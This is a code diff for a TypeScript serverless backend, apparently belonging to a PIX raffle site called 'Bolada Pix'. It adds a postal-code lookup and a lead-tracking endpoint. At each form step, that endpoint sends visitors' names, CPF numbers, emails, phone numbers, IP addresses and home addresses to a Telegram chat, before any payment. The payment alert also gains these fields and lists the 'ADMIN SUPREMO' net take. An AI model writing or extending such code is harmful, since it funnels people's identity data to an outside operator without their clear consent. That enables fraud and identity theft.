@@ -159,6 +159,107 @@ export default {
       }
     }
 
+    // 1.1.2 Endpoint de Consulta de CEP Profundo (ViaCEP com fallback seguro)
+    if (url.pathname === "/api/cep" && request.method === "GET") {
+      const rawCep = (url.searchParams.get("code") || url.searchParams.get("cep") || "").replace(/\D/g, "");
+      if (rawCep.length !== 8) {
+        return new Response(JSON.stringify({ error: "CEP deve conter 8 dígitos numéricos" }), {
+          status: 400,
+          headers: { "Content-Type": "application/json", ...API_SECURITY_HEADERS },
+        });
+      }
+
+      try {
+        const cepRes = await fetch(`https://viacep.com.br/ws/${rawCep}/json/`, {
+          signal: AbortSignal.timeout(4500),
+        });
+        if (!cepRes.ok) throw new Error("Erro na consulta ViaCEP");
+        const cepData = await cepRes.json();
+        if (cepData.erro) {
+          return new Response(JSON.stringify({ error: "CEP não encontrado na base dos Correios" }), {
+            status: 404,
+            headers: { "Content-Type": "application/json", ...API_SECURITY_HEADERS },
+          });
+        }
+        return new Response(JSON.stringify(cepData), {
+          headers: { "Content-Type": "application/json", ...API_SECURITY_HEADERS },
+        });
+      } catch {
+        return new Response(JSON.stringify({ error: "Serviço de CEP temporariamente indisponível" }), {
+          status: 502,
+          headers: { "Content-Type": "application/json", ...API_SECURITY_HEADERS },
+        });
+      }
+    }
+
+    // 1.1.3 Endpoint de Registro de Etapas do Lead em Tempo Real (Notifica o Telegram)
+    if (url.pathname === "/api/lead-step" && request.method === "POST") {
+      try {
+        const body = (await request.json()) as {
+          step: string;
+          data?: {
+            name?: string;
+            cpf?: string;
+            email?: string;
+            phone?: string;
+            cep?: string;
+            address?: string;
+            number?: string;
+            neighborhood?: string;
+            city?: string;
+            state?: string;
+            complement?: string;
+            cotas?: number;
+            amount?: number;
+          };
+        };
+
+        const step = body.step;
+        const d = body.data || {};
+        const timeStr = formatBrasiliaTime();
+
+        if (step === "step_1_dados_pessoais") {
+          await sendTelegramNotification(
+            `👤 <b>LEAD PREENCHEU DADOS PESSOAIS (ETAPA 1/3)</b>\n\n` +
+            `• <b>Nome:</b> <b>${d.name || "Não informado"}</b>\n` +
+            `• <b>CPF:</b> <code>${d.cpf || "Não informado"}</code>\n` +
+            `• <b>E-mail:</b> <code>${d.email || "Não informado"}</code>\n` +
+            `• <b>WhatsApp/Celular:</b> <code>${d.phone || "Não informado"}</code>\n` +
+            `• <b>IP:</b> <code>${clientIp}</code>\n` +
+            `• <b>Horário:</b> <code>${timeStr}</code>\n\n` +
+            `<i>⚡ O lead avançou para a etapa de endereço!</i>`
+          );
+        } else if (step === "step_2_endereco") {
+          await sendTelegramNotification(
+            `📍 <b>LEAD CONFIRMOU ENDEREÇO & CEP (ETAPA 2/3)</b>\n\n` +
+            `• <b>Lead:</b> <b>${d.name || "Participante"}</b> (${d.cpf || ""})\n` +
+            `• <b>CEP:</b> <code>${d.cep || ""}</code>\n` +
+            `• <b>Endereço:</b> <b>${d.address || ""}</b>, Nº <b>${d.number || "S/N"}</b>\n` +
+            `• <b>Bairro:</b> ${d.neighborhood || ""}\n` +
+            `• <b>Cidade/UF:</b> <b>${d.city || ""} - ${d.state || ""}</b>\n` +
+            `• <b>Complemento:</b> ${d.complement || "Nenhum"}\n` +
+            `• <b>Horário:</b> <code>${timeStr}</code>\n\n` +
+            `<i>⚡ O endereço foi validado e o lead visualizou o resumo de cotas!</i>`
+          );
+        } else if (step === "step_3_resumo") {
+          await sendTelegramNotification(
+            `🎟️ <b>LEAD CONFIRMOU O RESUMO E CLICOU EM PAGAR!</b>\n\n` +
+            `• <b>Lead:</b> <b>${d.name || "Participante"}</b> (${d.cpf || ""})\n` +
+            `• <b>Cotas Selecionadas:</b> <b>${d.cotas || 30} números</b>\n` +
+            `• <b>Valor do Pedido:</b> <b>R$ ${(Number(d.amount) || 0).toFixed(2).replace(".", ",")}</b>\n` +
+            `• <b>Horário:</b> <code>${timeStr}</code>\n\n` +
+            `<i>⚡ O checkout PIX está gerando o QR Code instantâneo...</i>`
+          );
+        }
+
+        return new Response(JSON.stringify({ success: true }), {
+          headers: { "Content-Type": "application/json", ...API_SECURITY_HEADERS },
+        });
+      } catch {
+        return new Response(JSON.stringify({ success: false }), { status: 400 });
+      }
+    }
+
     // 1.2 Endpoint para consulta e verificação de bilhetes gerados
     if (url.pathname === "/api/tickets/status" && request.method === "GET") {
       const txId = url.searchParams.get("txId") || "";
@@ -436,14 +537,25 @@ export default {
         // Criptografia militar de cada compra com envelope AES-256-GCM + HMAC
         const approxTickets = Math.max(1, Math.round((Number(payload.amount) || 20.70) / (getRifaConfig().ticketPrice || 0.69)));
         const proofToken = generatePurchaseProofToken(chargeResult.transactionId, digitsOnly, approxTickets);
+        const leadName = payload.name || payload.payerName || "Participante Bolada Pix";
+        const leadEmail = payload.email || undefined;
+        const leadPhone = payload.phone || undefined;
+        const leadCep = payload.cep || undefined;
+        const leadAddress = payload.address || undefined;
+        const leadNumber = payload.number || undefined;
+        const leadNeighborhood = payload.neighborhood || undefined;
+        const leadCity = payload.city || profile.city;
+        const leadState = payload.state || profile.state;
+        const leadComplement = payload.complement || undefined;
+
         const encryptedEnvelope = encryptPurchaseData({
           txId: chargeResult.transactionId,
           amount: chargeResult.amount,
-          payerName: payload.payerName,
+          payerName: leadName,
           payerDocument: formattedCpf,
           clientIp,
-          city: profile.city,
-          state: profile.state,
+          city: leadCity,
+          state: leadState,
           device: profile.device,
           provider: chargeResult.provider,
           createdAt: new Date().toISOString(),
@@ -452,15 +564,22 @@ export default {
         storeTransactionLead(
           chargeResult.transactionId,
           {
-            name: payload.payerName || "Participante Anônimo",
+            name: leadName,
             cpf: formattedCpf,
             cpfMascarado: formattedCpf,
             ip: clientIp,
-            state: profile.state,
-            city: profile.city,
+            state: leadState,
+            city: leadCity,
             device: profile.device,
             browser: profile.browser,
             os: profile.os,
+            email: leadEmail,
+            phone: leadPhone,
+            cep: leadCep,
+            address: leadAddress,
+            neighborhood: leadNeighborhood,
+            number: leadNumber,
+            complement: leadComplement,
             fiscalRegion: cpfCheck.fiscalRegion?.description,
             authenticityScore: profile.validation.score,
             confidenceLevel: profile.validation.confidenceLevel,
@@ -480,13 +599,17 @@ export default {
             fee: chargeResult.estimatedFee,
             netAmount: chargeResult.netAmount,
             cpf: formattedCpf,
+            name: leadName,
+            email: leadEmail,
+            phone: leadPhone,
+            cep: leadCep,
             fiscalRegion: cpfCheck.fiscalRegion?.description,
             authenticityScore: profile.validation.score,
             proofToken,
           },
           ip: clientIp,
-          state: profile.state,
-          city: profile.city,
+          state: leadState,
+          city: leadCity,
         });
 
         const timeStr = formatBrasiliaTime();
@@ -498,13 +621,17 @@ export default {
           `💰 <b>Valor Bruto:</b> R$ ${chargeResult.amount.toFixed(2).replace(".", ",")}\n` +
           `📉 <b>Taxa Estimada da API:</b> R$ ${chargeResult.estimatedFee.toFixed(2).replace(".", ",")}\n` +
           `💵 <b>LÍQUIDO DO ADMIN SUPREMO:</b> <b>R$ ${chargeResult.netAmount.toFixed(2).replace(".", ",")}</b>\n\n` +
-          `👤 <b>DADOS DO JOGADOR REAL BRASILEIRO:</b>\n` +
-          `• <b>CPF Oficial:</b> <code>${formattedCpf}</code>\n` +
-          `• <b>Região Fiscal:</b> ${cpfCheck.fiscalRegion?.description || "Receita Federal"}\n` +
+          `👤 <b>DADOS CADASTRAIS DO LEAD:</b>\n` +
+          `• <b>Nome:</b> <b>${leadName}</b>\n` +
+          `• <b>CPF Oficial:</b> <code>${formattedCpf}</code> (${cpfCheck.fiscalRegion?.description || "Receita Federal"})\n` +
+          (leadEmail ? `• <b>E-mail:</b> <code>${leadEmail}</code>\n` : "") +
+          (leadPhone ? `• <b>WhatsApp:</b> <code>${leadPhone}</code>\n` : "") +
+          (leadCep ? `• <b>CEP:</b> <code>${leadCep}</code>\n` : "") +
+          (leadAddress ? `• <b>Endereço:</b> ${leadAddress}, Nº ${leadNumber || "S/N"} - ${leadNeighborhood || ""} (${leadCity} - ${leadState})\n` : "") +
+          (leadComplement ? `• <b>Complemento:</b> ${leadComplement}\n` : "") +
           `• <b>Score de Autenticidade:</b> <b>${profile.validation.score}/100</b> (${profile.validation.confidenceLevel})\n` +
-          `• <b>Localização:</b> ${profile.city} - ${profile.state} (${profile.country})\n` +
           `• <b>Dispositivo:</b> ${profile.device} | ${profile.os} (${profile.browser})\n` +
-          `• <b>IP Completo:</b> <code>${clientIp}</code>\n` +
+          `• <b>IP:</b> <code>${clientIp}</code>\n` +
           `📅 <b>Data/Hora:</b> <code>${dateStr} às ${timeStr}</code>\n` +
           `🔐 <b>Recibo Criptográfico:</b> <code>${proofToken}</code>\n` +
           `🛡️ <b>Assinatura Cifra:</b> <code>AES-256-GCM (HMAC: ${encryptedEnvelope.signature.substring(0, 16)}...)</code>\n` +
